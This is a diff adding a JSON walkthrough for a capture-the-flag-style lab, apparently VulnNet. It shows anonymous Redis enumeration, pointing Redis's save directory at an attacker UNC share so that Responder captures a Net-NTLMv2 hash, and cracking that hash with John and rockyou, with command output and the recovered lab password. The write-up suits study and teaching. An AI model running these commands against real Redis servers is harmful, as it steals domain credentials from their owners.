@@ -1,0 +1,104 @@
+[
+  {
+    "type": "section_heading",
+    "id": "redis-enum-intro",
+    "text": "Phase 1: Redis Enumeration & NTLM Leakage"
+  },
+  {
+    "type": "order_block",
+    "id": "redis-theory",
+    "text": "Redis (Remote Dictionary Server) is an in-memory data structure store. When left unauthenticated (Anonymous Access), it becomes a high-risk vector for <highlight>Configuration Poisoning</highlight>. In Windows environments, we can manipulate Redis to interact with a remote UNC path, forcing the underlying service account to leak its <highlight>Net-NTLMv2 hash</highlight> via the SMB protocol."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "redis-discovery",
+    "text": "Step 1: Identifying Anonymous Redis Access & Parameters"
+  },
+  {
+    "type": "order_block",
+    "id": "redis-discovery-logic",
+    "text": "We begin by checking if the Redis service on port <highlight>6379</highlight> allows connections without a password. Once connected, we use the <highlight>config get *</highlight> command to enumerate available parameters. This confirms the current working directory and database filename settings."
+  },
+  {
+    "type": "code_block",
+    "id": "redis-cli-connect",
+    "language": "bash",
+    "code": "redis-cli -h <TARGET_IP>\nconfig get dir\nconfig get dbfilename"
+  },
+  {
+    "type": "output_block",
+    "id": "redis-info-output",
+    "language": "text",
+    "code": "1) \"dir\"\n2) \"C:\\\\Program Files\\\\Redis\"\n3) \"dbfilename\"\n4) \"dump.rdb\""
+  },
+
+  {
+    "type": "section_heading",
+    "id": "redis-ntlm-leak",
+    "text": "Step 2: Triggering NTLM Authentication Leak"
+  },
+  {
+    "type": "order_block",
+    "id": "responder-setup",
+    "text": "To capture the hash, we initiate <highlight>Responder</highlight> on our Kali machine. This tool acts as a rogue SMB server. Even without a real shared folder, Responder will intercept any incoming SMB handshake requests from the target."
+  },
+  {
+    "type": "code_block",
+    "id": "responder-exec",
+    "language": "bash",
+    "code": "sudo responder -I tun0 -v"
+  },
+  {
+    "type": "order_block",
+    "id": "redis-poisoning-logic",
+    "text": "Executing <highlight>config set dir</highlight> only updates the setting in memory and does not generate network traffic. To force a connection, we must trigger a file-write operation. By setting a <highlight>dbfilename</highlight> and issuing the <highlight>save</highlight> command, Windows is forced to authenticate with our rogue share to check for write permissions, thus leaking the hash."
+  },
+  {
+    "type": "code_block",
+    "id": "redis-commands",
+    "language": "bash",
+    "code": "config set dir \\\\<KALI_IP>\\share\nconfig set dbfilename redis.rdb\nsave"
+  },
+  {
+    "type": "output_block",
+    "id": "responder-capture-output",
+    "language": "text",
+    "code": "[+] Listening for events...\n[SMB] NTLMv2-SSP Client   : 10.10.154.40\n[SMB] NTLMv2-SSP Username : VULNNET\\enterprise-security\n[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:4e51...000000000000000000000000000"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "redis-hash-cracking",
+    "text": "Step 3: Offline Brute-Force Cracking"
+  },
+  {
+    "type": "order_block",
+    "id": "cracking-logic",
+    "text": "The captured Net-NTLMv2 hash cannot be used for 'Pass-the-Hash' attacks. We must perform an offline dictionary attack using <highlight>John the Ripper</highlight> and the <highlight>RockYou.txt</highlight> wordlist to recover the cleartext password."
+  },
+  {
+    "type": "code_block",
+    "id": "john-exec",
+    "language": "bash",
+    "code": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
+  },
+  {
+    "type": "output_block",
+    "id": "john-success-output",
+    "language": "text",
+    "code": "Loaded 1 password hash (NTLMv2-SSP [MD4/HMAC-MD5 128/128 AVX 4x])\nsand_0873959498  (enterprise-security)\n1 password cracked, 0 left"
+  },
+
+  {
+    "type": "explanation",
+    "id": "redis-summary",
+    "title": "Technical Summary of Phase 1",
+    "items": [
+      "Vulnerability: Anonymous Redis access (Misconfiguration)",
+      "Discovery: Used 'config get' to identify modifiable backup parameters",
+      "Mechanism: Triggered an SMB write request via the 'save' command to leak NTLMv2 hashes",
+      "Result: Gained valid domain credentials (VULNNET\\enterprise-security) after offline cracking"
+    ]
+  }
+]
